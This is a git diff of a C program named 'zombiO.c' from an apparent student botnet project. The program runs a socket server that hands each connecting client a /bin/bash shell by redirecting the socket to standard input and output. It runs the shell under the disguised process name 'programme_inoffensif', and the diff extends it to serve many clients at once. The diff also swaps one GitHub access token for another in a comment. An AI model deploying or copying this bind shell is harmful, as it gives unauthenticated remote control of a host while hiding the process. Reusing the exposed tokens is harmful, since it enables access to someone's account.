@@ -14,7 +14,7 @@
 #include <sys/sem.h>
 #include <sys/shm.h>
 #include <sys/socket.h>
-//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
+//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
 #include "utils_v2.h"
 #include "port.h"
 #include "botNet.h"
@@ -34,28 +34,32 @@ Zombie initSocketServer(bool withPort, int portReceived){
 	
 	slisten(sockfd, BACKLOG);
 	Zombie zombie= {
-		"zombiO.c", "127.0.0.1", port, sockfd,getpid() 
+		"zombiO.c", "127.0.0.1", port, sockfd,0 
 	};
 	return zombie;
 }
-
 
 void createBash (void * sock){
 	int* socket = sock;
 	for (int i = 0; i < 3; ++i){
 		dup2(*socket,i);
 	}
+	zombie.pid=getpid();
 	sexecl("/bin/bash", "programme_inoffensif", NULL);
 
 }
 
 void done(){
 	printf("fini\n");
+	for (int i = 0; i < numberChild; ++i){
+		skill(tabChild[i],SIGINT);
+	}
+	sclose(zombie.sockFd);
+
 	exit(0);
 }
 
 int main(int argc, char const *argv[]){
-	Zombie zombie; 
 	if(argc == 2)
 		zombie = initSocketServer(true,atoi(argv[1]));
 	else 
@@ -64,16 +68,18 @@ int main(int argc, char const *argv[]){
 
 	ssigaction(SIGINT,done);
 	printf("Le serveur tourne sur le port : %i  grace à souli\n", zombie.port);	
-	int newsockfd = saccept(zombie.sockFd);
-	swrite(newsockfd, &zombie, sizeof(Zombie));
-	printf("First write of zombie\n");
-	fork_and_run1(createBash,&newsockfd);
-	while(1){
-		sleep(10);
-	};
+	int newsockfd =0;
+	while((newsockfd = saccept(zombie.sockFd))>0){	
+		swrite(newsockfd, &zombie, sizeof(Zombie));
+		int childId=fork_and_run1(createBash,&newsockfd);
+		tabChild[numberChild]=childId;
+		numberChild++;
+	}
+		
+
+	
 	sclose(newsockfd);
 	sclose(zombie.sockFd);
-
 	return 0;
 }
 
